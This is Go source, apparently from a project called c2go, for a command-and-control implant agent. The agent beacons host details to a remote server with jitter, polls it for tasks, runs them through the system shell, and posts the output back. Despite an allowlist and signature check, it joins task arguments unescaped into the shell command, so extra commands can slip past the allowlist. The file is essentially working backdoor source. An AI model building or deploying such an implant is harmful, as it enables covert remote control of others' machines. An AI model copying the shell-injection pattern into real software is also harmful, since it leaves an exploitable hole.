package main

import (
    "bytes"
    "crypto/rand"
    "crypto/tls"
    "crypto/x509"
    "encoding/hex"
    "encoding/json"
    "io"
    "math/big"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "time"

    "c2go/shared"
)

var agentID string

func loadTLS() (*tls.Config, error) {
    cert, err := tls.LoadX509KeyPair("certs/agent.crt", "certs/agent.key")
    if err != nil { return nil, err }
    caPEM, _ := os.ReadFile("certs/ca.crt")
    pool := x509.NewCertPool()
    pool.AppendCertsFromPEM(caPEM)
    return &tls.Config{
        Certificates: []tls.Certificate{cert},
        RootCAs:      pool,
        MinVersion:   tls.VersionTLS13,
    }, nil
}

func newClient(cfg *tls.Config) *http.Client {
    return &http.Client{
        Timeout: 20 * time.Second,
        Transport: &http.Transport{TLSClientConfig: cfg},
    }
}

func fetchOperatorPub(c *http.Client, base string) error {
    // login dgn credential agent (di dunia nyata: agent enrol via token)
    body, _ := json.Marshal(map[string]string{
        "user": "agent", "pass": "AGENT_ENROL_SECRET",
    })
    resp, err := c.Post(base+"/api/login", "application/json", bytes.NewReader(body))
    if err != nil { return err }
    defer resp.Body.Close()
    var lr shared.LoginResp
    if err := json.NewDecoder(resp.Body).Decode(&lr); err != nil { return err }
    return setOperatorPub(lr.OperatorPub)
}

func sendBeacon(c *http.Client, base string) {
    h, _ := os.Hostname()
    b := shared.Beacon{
        AgentID: agentID, Hostname: h,
        OS: runtime.GOOS, Arch: runtime.GOARCH, IP: "127.0.0.1",
    }
    body, _ := json.Marshal(b)
    c.Post(base+"/api/beacon", "application/json", bytes.NewReader(body))
}

func poll(c *http.Client, base string) []shared.Task {
    resp, err := c.Get(base + "/api/tasks?agent_id=" + agentID)
    if err != nil { return nil }
    defer resp.Body.Close()
    var ts []shared.Task
    json.NewDecoder(resp.Body).Decode(&ts)
    return ts
}

func sendResult(c *http.Client, base string, r shared.Result) {
    body, _ := json.Marshal(r)
    c.Post(base+"/api/result", "application/json", bytes.NewReader(body))
}

func execute(t shared.Task) shared.Result {
    res := shared.Result{TaskID: t.ID, AgentID: agentID}
    var cmd *exec.Cmd
    switch runtime.GOOS {
    case "windows":
        cmd = exec.Command("cmd", "/C", t.Cmd+" "+t.Args)
    default:
        cmd = exec.Command("/bin/sh", "-c", t.Cmd+" "+t.Args)
    }
    out, err := cmd.CombinedOutput()
    res.Output = string(out)
    if err != nil { res.Error = err.Error() }
    return res
}

func jitterSeconds(min, max int) int {
    n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
    return min + int(n.Int64())
}

func main() {
    b := make([]byte, 8); rand.Read(b)
    agentID = "agent-" + hex.EncodeToString(b)

    cfg, err := loadTLS()
    if err != nil { panic(err) }
    c := newClient(cfg)
    base := c2URL()

    // enrol: ambil operator public key
    for i := 0; i < 5; i++ {
        if fetchOperatorPub(c, base) == nil { break }
        time.Sleep(3 * time.Second)
    }

    for {
        sendBeacon(c, base)
        for _, t := range poll(c, base) {
            if !shared.AllowedCmds[t.Cmd] { continue }
            if !verifyTask(t) { continue }
            go func(task shared.Task) {
                r := execute(task)
                sendResult(c, base, r)
            }(t)
        }
        // jitter beacon
        time.Sleep(time.Duration(jitterSeconds(15, 45)) * time.Second)
        _ = io.Discard
    }
}
